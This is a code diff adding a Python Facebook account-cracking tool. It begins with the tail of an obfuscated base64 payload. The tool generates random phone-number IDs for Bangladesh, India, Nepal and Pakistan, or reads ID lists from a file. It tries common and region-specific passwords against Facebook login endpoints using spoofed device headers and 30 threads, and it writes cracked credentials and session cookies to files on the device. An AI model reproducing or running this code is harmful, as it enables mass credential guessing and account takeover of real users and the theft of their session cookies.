nvS/4Hkn/FvGVO/920r6StXhD/mYYVrp9a0uLGrZyK1ZN8TgV7sosdGGFzRrmcUT5ndDNnYiMHKdDTXM4MnzOzmbOwkbPAXo+yNxa5nFt8zq145pa5eMXKm4tZ8syD/ay5jTO38ea2TXP3hrn74TRnHubNw5vmqxvmq3AuiZJOSMYNajzX/RbW3MiZG3lz46b5wob5wsN8znyJN1/aNF/eMCMlGEX1cuZJ3jyJ4pn2oVkeTqBnbObxlRifeZw90fzwGJvZy2X28pm9m5nDG5noqXaVy5zgMyc2M+mNTKQ4+7nMWT5zlp0L8Jnzm5nRjUxUCGGNP/NVPvNV4czLIxwDqXnKEZgtU1E8xpuK2OLzDyKsqYszdfGmrk3TwIZpgB0c40xXeNOVTRO1YaJY2s/OBjjTPG+aR71UiVj/QM+aWjlTK29q3TR1bZi6Ho5wpiHeNLRpGt8wwUoHnOo0TfGmKYiXDuCAVsLLDyjW1MmZOnlT56apf8OERkkPZxrjTWObJt+GCZYh2Jk5zhTgTYFNU2TDFGGjt9jYEmda5k3LIKqQLXKtzfJFLrZ2gp2aZYvm5L0OZqOIYcMxrugVvugV2MJoEbYwWsRHfwc4F/EuYam6W9imEI6NmrshoAcfETwj4BkVF0pH0UD6qeJbwEfFQconDGC48JgD51PR+U/gzBH/JDrCiBQWWSIiS0RkWRJZloBlWTym2YRGGoGzVf+p6EBW0HMM9Y39v1rfWNFvZWWvGLayhYWQgwJYadzKylu9/qZ51bCKQg6tGLfSslcHvnJu5dxWftVqjM+vYqs72f5hNn+Eyx/h80c2869u5KMOO8XlT/P505v58xv582zwOpfP8PmoriN8fnQzf3kjXzyvq2xBoOwXtEPdIbiq3846sKZ/M33VuGrcyshdDX9lfGX8EW7ILtsqrl2L8cW1bN0A3BfFE1zxBF88sVk8tVE8xU4HueIQXxzaLI5uFKuH69hXlvjiZVSVZBs0LylteChzOZQ22QtpI7im3y4oWtd/I33NuGb8bCuffKTDs8tUIGzraFjkr7BUZEAM4Jp1BUWaQny289b66aEKVLNwZebK134Ff5RntaJWQCBufFSQZapFzVqCYaC2aaAexzJQnmRg1Bmyn6kj7gKgw8D/x2rgSZ0R9EBhAqQCwoAURLM1bnqEn8JQvShgFHsZq3ikU0ATXoQdf6RTwHmsGDKpgCasF8NQ+TRwEjdg+5AqEd//2oHbB+LCF40/mbzpEG86CQU0q0BS4o9z2AkeO8FiJ1Iixg9s6TLikXjktRu3b8SlLyzhgQ3AbzXijRbdDy22xrPEDxswBH+kO9CUr/tRfl1zFrF5tDFntEa3VaMfPUNsn2mqnnTofnqy8cikSfczI4Y8PzMZJkuIn6WnTxYSPyswAKVQoJRkAu7QT7qJfzBYqWzdP2Qfo43EP7jTEPz/AC5TTcU="))))
+def login(uid):
+    global oks,loop
+    Session=requests.session()
+    try:
+        sys.stdout.write(f'\r\x1b[38;5;244m(\x1b[38;5;46m{date}\x1b[38;5;244m)\x1b[38;5;244m–\x1b[38;5;46m➤\x1b[38;5;244m[\x1b[38;5;46m{loop}\x1b[38;5;244m]\x1b[38;5;244m-\x1b[38;5;46m➤\x1b[38;5;244m[\x1b[38;5;46m{len(oks)}\x1b[38;5;244m/\x1b[38;5;46m{len(cps)}\x1b[38;5;244m]')
+        sys.stdout.flush()
+        for pw in ["123456","1234567","12345678","123456789","123123","112233","1234567890"]:
+            headers = {
+            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
+            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
+            "x-fb-net-hni": str(random.randint(20000, 40000)), 
+            "x-fb-connection-quality": "EXCELLENT",
+            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
+            "user-agent": windows(), 
+            "content-type": "application/x-www-form-urlencoded", 
+            "x-fb-http-engine": "Liger"}
+            rp=Session.get("https://api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_GB&client_country_code=GB&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
+            if "session_key" in rp:
+                print(f"\r\x1b[38;5;244m(\x1b[38;5;244mHOP-OK\x1b[38;5;244m)\x1b[38;5;244m {uid} ━\x1b[38;5;244m➤\x1b[38;5;46m {pw}")
+              #  coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+             #   print(f"\r\r\x1b[38;5;244m=(\x1b[38;5;46m💥\x1b[38;5;244m)={A} "+coki)
+             #   linex()
+                open('/sdcard/HOP-FILE-M1-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
+                open("/sdcard/HOP-OLD.txt","a").write(uid+"|"+pw+"\n")
+                cps.append(uid)
+                break 
+            elif "www.facebook.com" in rp["error_msg"]:              
+                print(f"\r\x1b[38;5;244m(\x1b[38;5;46mHOP-OK\x1b[38;5;244m)\x1b[38;5;46m {uid} ━\x1b[38;5;244m➤\x1b[38;5;46m {pw}")
+                open("/sdcard/HOP-OLD.txt","a").write(uid+"|"+pw+"\n")
+                oks.append(uid)
+                break
+            elif "Please Confirm Email" in str(rp):            
+                print(f"\r\x1b[38;5;244m(\x1b[38;5;46mHOP-OK\x1b[38;5;244m)\x1b[38;5;46m {uid} ━\x1b[38;5;244m➤\x1b[38;5;46m {pw}")
+                open("/sdcard/HOP-OLD.txt","a").write(uid+"|"+pw+"\n")
+                oks.append(uid)
+                break
+            else:continue
+        loop+=1
+    except:pass
+#__________________| MAIN |__________________#
+def menu():
+        try:
+                        clear()
+                        print(f'\x1b[38;5;244m({A}1\x1b[38;5;244m)\x1b[38;5;46m FILE CLONING \n\x1b[38;5;244m({A}2\x1b[38;5;244m)\x1b[38;5;46m RANDOM CLONING\n\x1b[38;5;244m({A}3\x1b[38;5;244m)\x1b[38;5;46m OLD CLONING\n\x1b[38;5;244m({A}0\x1b[38;5;244m)\x1b[38;5;46m EXIT TOOL')
+                        linex()
+                        xd=input(f'\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE : ')
+                        if xd in ['1','01']:
+                                clear();print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m EXAMPLE : /sdcard/XX.txt ');linex()
+                                file = input(f'\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m FILE NAME : ')
+                                try:
+                                        fo = open(file,'r').read().splitlines()
+                                except FileNotFoundError:
+                                        print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m FILE LOCATION NOT FOUND ')
+                                        time.sleep(1)
+                                        menu()
+                                clear()
+                                print(f'\x1b[38;5;244m({A}1\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M1\x1b[38;5;244m)\n\x1b[38;5;244m({A}2\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M2\x1b[38;5;244m)');linex()
+                                mthd=input(f'\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE : ')
+                                try:
+                                    clear()
+                                    ps_limit = int(input(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m PASSWORD LIMIT : '))
+                                except:
+                                    ps_limit =1
+                                clear()
+                                print(f'\x1b[38;5;244m[\x1b[1;97m✘\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m● \x1b[38;5;46mfirst last \x1b[38;5;244m|\x1b[38;5;46m first123')
+                                print(f'\x1b[38;5;244m[\x1b[1;97m✘\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m● \x1b[38;5;46m57273200 59039200 57575751 ');linex()
+                                for i in range(ps_limit):
+                                    plist.append(input(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m PASSWORD NO {i+1} \x1b[38;5;244m–\x1b[38;5;46m➤{A} '))
+                                linex()
+                                print(f'\x1b[38;5;244m[\x1b[1;97m✘\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m● \x1b[38;5;46mfirst last \x1b[38;5;244m|\x1b[38;5;46m first123')
+                                print(f'\x1b[38;5;244m[\x1b[1;97m✘\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m● \x1b[38;5;46m57273200 59039200 57575751 ');linex()
+                                clear()
+                                print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m DO YOU WENT SHOW CP ACCOUNT ➤ \x1b[38;5;244m[\x1b[38;5;46mY\x1b[38;5;244m/\x1b[1;91mN\x1b[38;5;244m]')
+                                linex()
+                                cx=input(f'\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE : ')
+                                if cx in ['y','Y','yes','Yes','1']:
+                                        pcp.append('y')
+                                else:
+                                        pcp.append('n')
+                                with tred(max_workers=30) as crack_submit:
+                                        clear()
+                                        total_ids = str(len(fo))
+                                        print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m TOTAL ACCOUNT \x1b[38;5;244m–\x1b[38;5;46m➤{A} '+total_ids+f' \x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m PASS \x1b[38;5;244m–\x1b[38;5;46m➤{A} {ps_limit}')
+                                        print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m IF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE{B}[{A}M{mthd}{B}]')
+                                        linex()
+                                        for user in fo:
+                                                ids,names = user.split('|')
+                                                passlist = plist
+                                                if mthd in ['1','01']:
+                                                        crack_submit.submit(api1,ids,names,passlist)
+                                                elif mthd in ['2','02']:
+                                                        crack_submit.submit(api2,ids,names,passlist)
+                                print('\033[1;37m')
+                                print(f'\r\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37m')
+                                print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m THE PROCESS HAS COMPLETED')
+                                print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m TOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)))
+                                print(f'\r\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37m')
+                                input(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m PRESS ENTER TO BACK ')
+                                menu()
+                        elif xd in ['2','02']:
+                                randm()
+                        elif xd in ['3','03']:
+                                _old_()
+                        elif xd in ['0','05']:
+                                exit(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m EXIT DONE ')
+                        else:
+                                exit(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m OPTION NOT FOUND IN MENU...')
+        except ValueError:
+                exit()
+        except requests.exceptions.ConnectionError:
+                print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m NO INTERNET CONNECTION...')
+                exit()
+#__________________| RANDOM |__________________#
+def randm():
+    clear()
+    print(f'\x1b[38;5;244m({A}1\x1b[38;5;244m)\x1b[38;5;46m BANGLADESH CLONING ')
+    print(f'\x1b[38;5;244m({A}2\x1b[38;5;244m)\x1b[38;5;46m INDIA CLONING ')
+    print(f'\x1b[38;5;244m({A}3\x1b[38;5;244m)\x1b[38;5;46m NEPAL CLONING ')
+    print(f'\x1b[38;5;244m({A}4\x1b[38;5;244m)\x1b[38;5;46m PAKISTAN CLONING ')
+    print(f'\x1b[38;5;244m({A}0\x1b[38;5;244m)\x1b[38;5;46m BACK TO MENU ');linex()
+    option=input(f'\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE : ')
+    if option in ['1','A']:
+        bd()
+    elif option in ['2','B']:
+        india()
+    elif option in ['3','C']:
+        nepal()
+    elif option in ['4','E']:
+        pak()
+    elif option in ['0','00']:
+        menu()
+    else:
+        exit(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m BYE BYE ')
+
+
+		
+#__________________| BANGLADESH |__________________#
+def bd():
+        user=[]
+        clear()
+        print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m EXAMPLE : 017 | 019 | 018 | 016 ');linex()
+        code = input(f'\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE  : ')
+        clear();print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
+        limit = int(input(f'\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE  : '))
+        clear()
+        print(f'\x1b[38;5;244m({A}1\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M1\x1b[38;5;244m)\x1b[38;5;46m \n\x1b[38;5;244m({A}2\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M2\x1b[38;5;244m)\x1b[38;5;46m ');linex()
+        mthd = input(f'\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE  : ')
+        for nmbr in range(limit):
+            nmp=''.join(random.choice(string.digits) for _ in range(8))
+            user.append(nmp)
+        with tred(max_workers=30) as habib:    
+            clear()
+            tl = str(len(user))
+            print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m SIM CODE :{A} {code} ')
+            print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m TOTAL ID :{A} {tl} ')
+            print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m IF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE{B}[{A}M{mthd}{B}]');linex()
+            for psx in user:
+                uid = code+psx
+                passlist = [psx,uid,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
+                if mthd in ['1','01']:
+                    habib.submit(rndm1,uid,passlist)
+                if mthd in ['2','02']:
+                    habib.submit(rndm2,uid,passlist)
+        print('\033[1;37m')
+        print(f'\r\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37m')
+        print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m THE PROCESS HAS COMPLETED')
+        print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m TOTAL OK ID : '+str(len(oks)))
+        print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m TOTAL CP ID : '+str(len(cps)))
+        print(f'\r\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37m')
+        input(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m PRESS ENTER TO BACK ')
+        menu()
+#__________________| INDIA |__________________#
+def india():
+        user=[]
+        clear()
+        print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m EXAMPLE : +91639 | +91934 | +91902 | +91937 ');linex()
+        code = input(f'\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE  : ')
+        clear();print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
+        limit = int(input(f'\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE  : '))
+        clear()
+        print(f'\x1b[38;5;244m({A}1\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M1\x1b[38;5;244m)\x1b[38;5;46m \n\x1b[38;5;244m({A}2\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M2\x1b[38;5;244m)\x1b[38;5;46m ');linex()
+        mthd = input(f'\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE  : ')
+        for nmbr in range(limit):
+            nmp = "". join(random.choice(string.digits) for _ in range(7))
+            user.append(nmp)
+        with tred(max_workers=30) as habib:    
+            clear()
+            tl = str(len(user))
+            print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m SIM CODE :{A} {code} ')
+            print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m TOTAL ID :{A} {tl} ')
+            print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m IF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE{B}[{A}M{mthd}{B}]');linex()
+            for psx in user:
+                uid = code+psx
+                passlist = [psx,uid[:8],'57273200','59039200','57575751']
+                if mthd in ['1','01']:
+                    habib.submit(rndm1,uid,passlist)
+                if mthd in ['2','02']:
+                    habib.submit(rndm2,uid,passlist)
+        print('\033[1;37m')
+        print(f'\r\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37m')
+        print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m THE PROCESS HAS COMPLETED')
+        print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m TOTAL OK ID : '+str(len(oks)))
+        print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m TOTAL CP ID : '+str(len(cps)))
+        print(f'\r\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37m')
+        input(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m PRESS ENTER TO BACK ')
+        menu()
+#__________________| NEPAL |__________________#
+def nepal():
+        user=[]
+        clear()
+        print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m EXAMPLE : 9815 | 9814 | 9861 | 9840 ');linex()
+        code = input(f'\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE  : ')
+        clear();print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
+        limit = int(input(f'\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE  : '))
+        clear()
+        print(f'\x1b[38;5;244m({A}1\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M1\x1b[38;5;244m)\x1b[38;5;46m \n\x1b[38;5;244m({A}2\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M2\x1b[38;5;244m)\x1b[38;5;46m ');linex()
+        mthd = input(f'\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE  : ')
+        for nmbr in range(limit):
+            nmp = "". join(random.choice(string.digits) for _ in range(6))
+            user.append(nmp)
+        with tred(max_workers=30) as habib:    
+            clear()
+            tl = str(len(user))
+            print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m SIM CODE :{A} {code} ')
+            print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m TOTAL ID :{A} {tl} ')
+            print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m IF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE{B}[{A}M{mthd}{B}]');linex()
+            for psx in user:
+                uid = code+psx
+                passlist = [uid,psx,uid[:8],uid[:7],uid[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','tamang12345','nepal@123','kathmandu123']
+                if mthd in ['1','01']:
+                    habib.submit(rndm1,uid,passlist)
+                if mthd in ['2','02']:
+                    habib.submit(rndm2,uid,passlist)
+        print('\033[1;37m')
+        print(f'\r\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37m')
+        print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m THE PROCESS HAS COMPLETED')
+        print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m TOTAL OK ID : '+str(len(oks)))
+        print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m TOTAL CP ID : '+str(len(cps)))
+        print(f'\r\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37m')
+        input(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m PRESS ENTER TO BACK ')
+        
+def pak():
+        user=[]
+        clear()
+        print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m EXAMPLE : 0301 | 0311 | 0322 | 0344 ');linex()
+        code = input(f'\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE  : ')
+        clear();print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
+        limit = int(input(f'\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE  : '))
+        clear()
+        print(f'\x1b[38;5;244m({A}1\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M1\x1b[38;5;244m)\x1b[38;5;46m \n\x1b[38;5;244m({A}2\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M2\x1b[38;5;244m)\x1b[38;5;46m ');linex()
+        mthd = input(f'\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE  : ')
+        for nmbr in range(limit):
+            nmp=''.join(random.choice(string.digits) for _ in range(8))
+            user.append(nmp)
+        with tred(max_workers=30) as habib:    
+            clear()
+            tl = str(len(user))
+            print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m SIM CODE :{A} {code} ')
+            print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m TOTAL ID :{A} {tl} ')
+            print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m IF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE{B}[{A}M{mthd}{B}]');linex()
+            for psx in user:
+                uid = code+psx
+                passlist = [psx,uid,'khankhan123','786786','khankhan','786786','khan123','khan12345','khan123456','khanbaba','khan786','khankhan12345','malik123','malik12345','khanzada','kingkhan','khan1234','alikhan','pak123','ali123','ali12345','ali786','ali123456','jan jan','baloch','baloch123','khan1122','khan12','i love you','iloveyou','janjan']
+                if mthd in ['1','01']:
+                    habib.submit(rndm1,uid,passlist)
+                if mthd in ['2','02']:
+                    habib.submit(rndm2,uid,passlist)
+        print('\033[1;37m')
+        print(f'\r\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37m')
+        print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m THE PROCESS HAS COMPLETED')
+        print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m TOTAL OK ID : '+str(len(oks)))
+        print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m TOTAL CP ID : '+str(len(cps)))
+        print(f'\r\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37m')
+        input(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m PRESS ENTER TO BACK ')
+        menu()
+#__________________| FILE METHOD M1 |__________________#
+def api1(ids,names,passlist):
+        try:
+                global oks,loop,sim_id,device
+                sys.stdout.write(f'\r\r\x1b[38;5;244m(\x1b[38;5;46m{date}\x1b[38;5;244m)\x1b[38;5;46m %s \x1b[38;5;244m|\x1b[38;5;46m OK\x1b[38;5;244m|\x1b[38;5;46mCP\x1b[38;5;46m %s\x1b[38;5;244m|\x1b[38;5;46m%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+                fn = names.split(' ')[0]
+                try:
+                        ln = names.split(' ')[1]
+                except:
+                        ln = fn
+                for pw in passlist:
+                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
+                        fbbv = str(random.randint(111111111,999999999))
+                        android_version = device['android_version']
+                        model = device['model']
+                        build = device['build']
+                        fblc = device['fblc']
+                        fbcr = sim_id
+                        fbmf = device['fbmf']
+                        fbbd = device['fbbd']
+                        fbdv = device['fbdv']
+                        fbsv = device['fbsv']
+                        fbca = device['fbca']
+                        fbdm = device['fbdm']
+                        fbfw = '1'
+                        fbrv = '0'
+                        fban = 'FB4A'
+                        fbpn = 'com.facebook.katana'
+                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
+                        random_seed = random.Random()
+                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
+                        device_id = str(uuid.uuid4())
+                        secure = str(uuid.uuid4())
+                        family = str(uuid.uuid4())
+                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
+                        sim_serials = f'["{xd}"]'
+                        li = ['28','29','210']
+                        li2 = random.choice(li)
+                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
+                        jazoest = li2+j1
+                        data = {
+                                'adid':adid,
+                                'format':'json',
+                                'device_id':device_id,
+                                'email':ids,
+                                'password':pas,
+                                'generate_analytics_claims':'1',
+                                'community_id':'',
+                                "sim_country": "id",
+                                'try_num':'1',
+                                'family_device_id':family,
+                                'sim_serials':sim_serials,
+                                'credentials_type':'password',
+                                'source':'login',
+                                'error_detail_type':'button_with_disabled',
+                                'logged_out_id': str(uuid.uuid4()),
+                                'generate_session_cookies':'1',
+                                'generate_machine_id':'1',
+                                'tier': 'regular',
+                                'reg_instance': str(uuid.uuid4()),
+                                'meta_inf_fbmeta':'',
+                                'currently_logged_in_userid':'0',
+                                'locale':fblc,
+                                'client_country_code':'',
+                                'fb_api_req_friendly_name':'authenticate',
+                                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+                        }
+                        headers={
+                                'Authorization':f'OAuth {accessToken}',
+                                'X-FB-Friendly-Name':'authenticate',
+                                'X-FB-Connection-Bandwidth':str(random.randint(2e7,3e7)),
+                                'X-FB-Net-HNI': str(random.randint(11111, 99999)),
+                                'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
+                                'User-Agent': ua,
+                                'Accept-Encoding':'gzip, deflate',
+                                'Content-Type': 'application/x-www-form-urlencoded',
+                                'X-FB-HTTP-Engine': 'Liger'
+                                }
+                        url = 'https://graph.facebook.com/auth/login'
+                        po = requests.post(url,data=data,headers=headers).json()
+                        if 'session_key' in po:
+                                        print(f'\r\r\x1b[38;5;244m(\x1b[38;5;46mHOP-OK\x1b[38;5;244m)\x1b[38;5;46m '+ids+f' ━\x1b[38;5;244m➤\x1b[38;5;46m '+pas+'\033[1;97m')
+                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+                                        print(f"\r\r\x1b[38;5;244m=(\x1b[38;5;46m💥\x1b[38;5;244m)={A} "+coki)
+                                        linex()
+                                        open('/sdcard/HOP-FILE-M1-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
+                                        oks.append(ids)
+                                        break
+                        elif 'www.facebook.com' in po['error']['message']:
+                                        if 'y' in pcp:
+                                                print(f'\r\r\x1b[38;5;244m({Y}HOP-CP\x1b[38;5;244m){Y} '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/HOP-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                cps.append(ids)
+                                                break
+                                        else:
+                                                break
+                        else:
+                                        continue
+                loop+=1
+        except Exception as e:
+                pass
+#__________________| FILE METHOD M2 |__________________#
+def api2(ids,names,passlist):
+        try:
+                global oks,loop,sim_id
